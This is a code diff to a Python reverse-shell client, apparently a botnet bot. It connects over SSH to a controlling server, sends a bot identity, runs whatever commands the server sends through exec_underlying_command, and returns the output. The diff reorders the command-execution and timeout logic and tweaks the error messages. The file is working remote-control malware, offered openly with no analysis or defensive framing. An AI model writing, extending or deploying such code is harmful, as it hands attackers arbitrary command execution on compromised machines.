@@ -95,7 +95,6 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
     #while server_instructions != "kill":
     if ssh_session.active:
-        timeout_thread =  threading.Thread(target=max_timeout, args=())
         print("[!] Sending identity!")
         ssh_session.send(bot_user.encode())
 
@@ -110,9 +109,27 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
                 print("[!] Session terminated by the server!")
                 exit_gracefully()
 
+
+            # Execute command on the channel and capture output
+            print("Trying to execute the command")
+            try:
+                response = exec_underlying_command(server_instructions)
+            except Exception as e:
+                response = f"Command failed:\t{e}"
+
+            ssh_session.send(response.encode())
+
+            print("[!] Response sent!")
+
+            timeout_thread =  threading.Thread(target=max_timeout, args=())
             if timeout == True:
+                timeout = False
                 ssh_session.close()
                 ssh_client.close()
+
+                response = f"Timeout while listening new instructions!"
+                ssh_session.send(response.encode())
+                print("[!] Response sent!")
 
                 # Make a recursive call
                 try:
@@ -121,17 +138,6 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
                     pass
 
                 return
-
-            # Execute command on the channel and capture output
-            print("Trying to execute the command")
-            try:
-                response = exec_underlying_command(server_instructions)
-            except Exception as e:
-                response = e
-
-            ssh_session.send(response.encode())
-
-            print("[!] Response sent!")
 
             #server_instructions = "kill"
             ssh_session.close()
